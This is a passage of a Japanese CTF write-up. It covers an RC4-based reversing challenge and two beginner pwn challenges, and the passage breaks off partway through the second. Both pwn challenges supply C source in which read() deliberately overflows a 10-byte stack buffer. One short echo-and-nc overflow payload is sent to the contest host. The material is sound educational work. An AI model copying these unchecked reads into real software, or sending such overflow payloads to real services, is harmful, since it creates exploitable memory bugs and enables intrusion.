    style="padding-bottom: 82.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB/klEQVQ4y5VTyW7bMBDVt9jWSlEbqbV1k8C25B5yyK2XAvEiL01RoP9/eJ2h7MDoxdbhaTiP5NNstPr9Fr8/DmC7OZzxTjieenyce+yJ608H7Po9jv0Ov850ru8Nt91tcToyd8SeuMPpiM1uD6ttV/i+bsF22a4Nuq7FmrnVCu26Q0t+R/tdR2eWS3TMtXSGfOav3Io4yxcStm3DdR04V+tc1mTtmT2A1/awx+edi8/8LWeJMESaRFjMCxR5hvpLDZVrzBuNl+cGWVUjiiMEQfAQrCAQRlCpFKqqkKSpgW4KpIVCTjYrcvg+XfD9+4JCCEQyRCgCgygUkOTHUYIkThCIEL7nDRdI1L8jaoWUMotypM+NGlKvK6hMQyuNUA7p+g9E959ggCpXqKuSBGuUZUmloPTjeJzgNWUZDlFGUWREVKYQk+UfjhIMxNAUrTNqQg4ZSUjyJTXGdV0jdBXzH21KzCIUYaVzPJU1vlWNSVdcogsejO6mhiE8uvTj9Q1/f27w573HYrGCpnpKKoE/RpDFTP18DyqN0VQaRZEhThN4l3EZKciNkEh0AZEouDRr/Iw81/us3zhB+vCslfMXlF+fUNJrKfIccZJQ5KGJ8lb4Hqw4zehlSDMqGYnkWqPiGSSeR4gz4Do/CstxXMxmM4MpYzrFZDIxljlOfwz+AdOdFpEFktmHAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/d4dd2736a58258f75906e4d417a3011d/8ac56/image-20240615171546469.webp 240w,
/static/d4dd2736a58258f75906e4d417a3011d/ced2a/image-20240615171546469.webp 444w"
              sizes="(max-width: 444px) 100vw, 444px"
              type="image/webp"
            />
          <source
            srcset="/static/d4dd2736a58258f75906e4d417a3011d/8ff5a/image-20240615171546469.png 240w,
/static/d4dd2736a58258f75906e4d417a3011d/9b7bd/image-20240615171546469.png 444w"
            sizes="(max-width: 444px) 100vw, 444px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/d4dd2736a58258f75906e4d417a3011d/9b7bd/image-20240615171546469.png"
            alt="image-20240615171546469"
            title="image-20240615171546469"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>この関数では 0xcafe のシステムコールにて以下のようなコードが呼び出されるように定義されています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 743px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/b2e65ee39d336559d28a25f7aa1df66c/f2793/image-20240615171618621.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 37.083333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABDUlEQVQoz41R2U7DMBD059jx7dh1SpK2CFIhkCgggYTE///GsGuqcLzQh/H6nJ0ZC+8cQorwIcAFD0tQSq3ouo5qt87/g+AhRY9aEkpybe68h0+hVSW/iS4hFVprlJyxKRm1FsQYYK1tMNaAzy9RthIaY0gVqwnwMcJRBJEisETGZ0zMlqWUTaFkSLWu2cHPiIQ+W4lElpNHqZWUWeqm4Kymfd9iKJmbWXhnEL35yttoWBLAza3jNxoi0Gew3XEouNpW1GGgusVIxNOmYCDknOhOj0TKe0Luqea+iUh9ao7i+WPFfrfDcrzFkbAsN7hbrvF2esLH8yveH19wun/A/nDAOE6Ypr+Yf63necYn7D7bISv9VqYAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/b2e65ee39d336559d28a25f7aa1df66c/8ac56/image-20240615171618621.webp 240w,
/static/b2e65ee39d336559d28a25f7aa1df66c/d3be9/image-20240615171618621.webp 480w,
/static/b2e65ee39d336559d28a25f7aa1df66c/53666/image-20240615171618621.webp 743w"
              sizes="(max-width: 743px) 100vw, 743px"
              type="image/webp"
            />
          <source
            srcset="/static/b2e65ee39d336559d28a25f7aa1df66c/8ff5a/image-20240615171618621.png 240w,
/static/b2e65ee39d336559d28a25f7aa1df66c/e85cb/image-20240615171618621.png 480w,
/static/b2e65ee39d336559d28a25f7aa1df66c/f2793/image-20240615171618621.png 743w"
            sizes="(max-width: 743px) 100vw, 743px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/b2e65ee39d336559d28a25f7aa1df66c/f2793/image-20240615171618621.png"
            alt="image-20240615171618621"
            title="image-20240615171618621"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このシステムコール内で呼び出されるコールバック関数では、ハードコードされた Seed を元に Key を生成し、同じくハードコードされた暗号文を復号関数で平文にした文字列が入力値と一致するかどうかを検証しているようです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 761px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/3f5067115416a2885d9e251d67c555f4/8c857/image-20240615171527179.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 101.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAACAUlEQVQ4y51UWbLbMAzzbV5sa1+8pOmbrPXr/Q+EgnLsSZq2E/cDIw8lQyBBqrper7hcLrhMP1dMXxN+TDdcbzecTqdNqOqmgdYaRitYa9A0Neq6xm63w+7jY143oFJKwXuHLgUMQ4ZzFtZbaGMKccMLt6BSbUuFVEciRaUSFKKFbCspFbZI0aFt2jnYvh7aQlq1VCjo+4wQA1zws0LWo+BB6TvEK6Fn3Zz3NMYiOg0fI2xKMM69rVDOlRoKoazicgwOhmUQUxTR0rRF3b+wKlyYVasQqTJFT3NmMkXFhZSXGV5WzDPsCqvKt6jXIUJLFkvbhBCYrkdiesPQs5Ydctch9T3SMCDmDpF7mfHAMiTWObPFIteUM2I37wuHI3F1OBwguN2uOJ5POE9f+DydC74Ljkd8nrmeL/jGc+O4x7jfY0+M44j9gnusqus595xnhy0VS4qN1OWPdaqfUPYeTVlc1iy+o8MpWORgS29mGuR5ieMkCaQsXbTFuC55eA6D7AsM/5WpWwnFZWN0GT0h9c4geMOYKWRlj4iMlz1COkHqZu5j+qRQ2EV24G25S5yY9q12eWmbhbC9z7S0TZ99eYHKbG9o6idC6UNJq6c6SWmJ/42wFkOaev1+UigfMiXyfKnfJmPLHK+E8rhqqrNGv74uW58vmVVxTNwV1/7nDXzELwXKZkjd7lt3AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/3f5067115416a2885d9e251d67c555f4/8ac56/image-20240615171527179.webp 240w,
/static/3f5067115416a2885d9e251d67c555f4/d3be9/image-20240615171527179.webp 480w,
/static/3f5067115416a2885d9e251d67c555f4/6e34c/image-20240615171527179.webp 761w"
              sizes="(max-width: 761px) 100vw, 761px"
              type="image/webp"
            />
          <source
            srcset="/static/3f5067115416a2885d9e251d67c555f4/8ff5a/image-20240615171527179.png 240w,
/static/3f5067115416a2885d9e251d67c555f4/e85cb/image-20240615171527179.png 480w,
/static/3f5067115416a2885d9e251d67c555f4/8c857/image-20240615171527179.png 761w"
            sizes="(max-width: 761px) 100vw, 761px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/3f5067115416a2885d9e251d67c555f4/8c857/image-20240615171527179.png"
            alt="image-20240615171527179"
            title="image-20240615171527179"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>復号関数の実装を見ると明らかに RC4 でしたので、 rc4 関数にリネームを行っています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 900px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/3c44ed3c0ca02456a7f58b45e3025f9b/1cfc2/image-20240615171633672.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 82.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB3ElEQVQ4y51UW5KjMBDzYRLC28Y22GSq8p8w5P636ZUa2N2pmtpk9kNlQ+xuSS1iluVT1udTns9V1nXV9RPP9/tdHoqHPB6vsSyL3jFd14kPXnrbS1NXUgNtU0vXtdK0RCNlWb4Nk6ZR5muSKSe5zUFutw8Z8c6iAZt0QF03QP0WTAhBi8UxyhSspDlJ75x244GqqhSvCh1nzDA4iTEIV4tCzg/isO/7TmgH2f2oIKX5wcrgWQQSUaiFd38f+glMzqMEDCXCNxcGfdk0m2eUXZXVZni1rWxS7jjs4Jljb8jGeg+Zg8TgNsDPnPM+fQsFTrzr1AoqcFTlMDRYwt+ts6qOq+GPMWVI9iqdbAf4GOArm7AI/WWU2JzsW0SpA7hnrP68b8VcIfkjRxnDNpTesWOveTx8PKS+gnroSJcS/MZEJVEOJLDjvy5/OxReSsjhDKY6IEidIvxkA8oHgnfqGT1yGi/7JaNfGDJrKU/6deQ0YiAB+ygBzzF6mVMUfk0Whagm0mfFFjeuw55fqjIjLk2jV1bXyUtCgRGFPZjSihbfNGPxdg57XKAkDTb/EHSa++T2Sb4zkN+SI6hewSpDatf333Y9gv4KPGeK4qKxuFwucj6f/xun00mKopBfhXcL7QyA0GEAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/3c44ed3c0ca02456a7f58b45e3025f9b/8ac56/image-20240615171633672.webp 240w,
/static/3c44ed3c0ca02456a7f58b45e3025f9b/d3be9/image-20240615171633672.webp 480w,
/static/3c44ed3c0ca02456a7f58b45e3025f9b/131f1/image-20240615171633672.webp 900w"
              sizes="(max-width: 900px) 100vw, 900px"
              type="image/webp"
            />
          <source
            srcset="/static/3c44ed3c0ca02456a7f58b45e3025f9b/8ff5a/image-20240615171633672.png 240w,
/static/3c44ed3c0ca02456a7f58b45e3025f9b/e85cb/image-20240615171633672.png 480w,
/static/3c44ed3c0ca02456a7f58b45e3025f9b/1cfc2/image-20240615171633672.png 900w"
            sizes="(max-width: 900px) 100vw, 900px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/3c44ed3c0ca02456a7f58b45e3025f9b/1cfc2/image-20240615171633672.png"
            alt="image-20240615171633672"
            title="image-20240615171633672"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>Flag を取得するため、まずは以下のコードで Seed から Key を生成しました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">_4010 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xd2</span><span class="token punctuation">,</span> <span class="token number">0xbc</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xb2</span><span class="token punctuation">,</span> <span class="token number">0x7c</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xb1</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0x5c</span><span class="token punctuation">,</span> <span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0xd1</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token number">0x4b</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0x5c</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">]</span>
_4030 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">]</span>

k <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> k <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>_4030<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    _4030<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>k<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">^</span> _4030<span class="token punctuation">[</span>k<span class="token punctuation">]</span>
    k <span class="token operator">+=</span> <span class="token number">1</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> _4030<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre></div>
<p>あとは生成した Key と暗号文を使用して RC4 復号を行うと Flag を取得できました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/2130b/image-20240615171046653.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 57.50000000000001%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABEElEQVQoz5WTi46DIBBF/f9fXDdq65OqFdBBEb0Fmm1227VVk5MhMDkMkzGoOwapODh1EB6OJIvwnYRgF4Z+6DHQ8AIp8qiRIKRAXmSI4ghB3ISoqcRlKB6wPkfOT2ivLQQX4Jz/QQiJcRzvqHtUNhIRgqrPUCsrpMKKCzR27WLZp1hWg6NfEDVfSLsYhTgj5TGSNkQuTijlGdpon7Su626C6lr6HtJke6UlhOqgZoKcOswfhP9WSLrHaJSFfJz8WsHtm8U8hLuf/O7wR3RIaIvffNKyLMd7+FzB76qc8Ijso/B5b3cPt4RSSjuwCsYYaK03cYNd17UdePFeyBhD27Y+0f0F8zy/4C5zwqqqfN4N4CqtFHtIk4kAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/8ac56/image-20240615171046653.webp 240w,
/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/d3be9/image-20240615171046653.webp 480w,
/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/e46b2/image-20240615171046653.webp 960w,
/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/7bb49/image-20240615171046653.webp 1271w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/8ff5a/image-20240615171046653.png 240w,
/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/e85cb/image-20240615171046653.png 480w,
/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/d9199/image-20240615171046653.png 960w,
/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/2130b/image-20240615171046653.png 1271w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/e4ea391aff9a7566fbf26ec1bf8aa8bf/d9199/image-20240615171046653.png"
            alt="image-20240615171046653"
            title="image-20240615171046653"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>一応難易度は Hard とのことでしたが、ぱっと見ですぐ解けたので多少は Rev 力が上がったのかもしれません。</p>
<h2 id="simpleoverflowpwn" style="position:relative;"><a href="#simpleoverflowpwn" aria-label="simpleoverflowpwn permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>simpleoverflow(Pwn)</h2>
<blockquote>
<p>Cでは、0がFalse、それ以外がTrueとして扱われます。</p>
</blockquote>
<p>スーパイージー問題でした。</p>
<p>問題バイナリについて以下のソースコードが与えられます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> is_admin <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>is_admin<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You are not admin. bye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat ./flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>特に解析の必要もなく、適当に以下のペイロードを送り込んで Flag を取得しました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token builtin class-name">echo</span> -e <span class="token string">'\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01'</span> <span class="token operator">|</span> <span class="token function">nc</span> simpleoverflow.beginners.seccon.games <span class="token number">9000</span></code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 872px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/dbd60843c29d84ecb6825a7779960a19/65654/image-20240616081357044.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 12.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiElEQVQI16WNyw6CMBBFmwjC9LEwQKEtaCstuvH/P+86adQfcHFyHzPJFellsT0G+JuDu2Zs+5P9jpAO2PWOiw3wsSAwX53XhLhnpBQxTiN88ChHRikZwi0ORBLduWPtobWClFRp2wZNc6reGP3rlZKcTf0nos/doOcs7DzxyoBlmbkgCCH+4g0XCEYsykgQ2gAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/dbd60843c29d84ecb6825a7779960a19/8ac56/image-20240616081357044.webp 240w,
/static/dbd60843c29d84ecb6825a7779960a19/d3be9/image-20240616081357044.webp 480w,
/static/dbd60843c29d84ecb6825a7779960a19/a8a2c/image-20240616081357044.webp 872w"
              sizes="(max-width: 872px) 100vw, 872px"
              type="image/webp"
            />
          <source
            srcset="/static/dbd60843c29d84ecb6825a7779960a19/8ff5a/image-20240616081357044.png 240w,
/static/dbd60843c29d84ecb6825a7779960a19/e85cb/image-20240616081357044.png 480w,
/static/dbd60843c29d84ecb6825a7779960a19/65654/image-20240616081357044.png 872w"
            sizes="(max-width: 872px) 100vw, 872px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/dbd60843c29d84ecb6825a7779960a19/65654/image-20240616081357044.png"
            alt="image-20240616081357044"
            title="image-20240616081357044"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h2 id="simpleoverwritepwn" style="position:relative;"><a href="#simpleoverwritepwn" aria-label="simpleoverwritepwn permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>simpleoverwrite(Pwn)</h2>
<blockquote>
<p>スタックとリターンアドレスを確認しましょう</p>
</blockquote>
<p>スーパイージー問題 2 でした。</p>
<p>問題バイナリについて以下のコードが与えられます。</p>
<p>win 関数に飛ばせば Flag を取得できることがわかります。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  FILE <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"return to: 0x%lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>保護機構を見ると NX 以外何もありませんでしたので、単純に BoF で win 関数を取れそうです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 814px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/b130df030f34edc06c1cc1d707dfdd00/a4262/image-20240616081623373.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
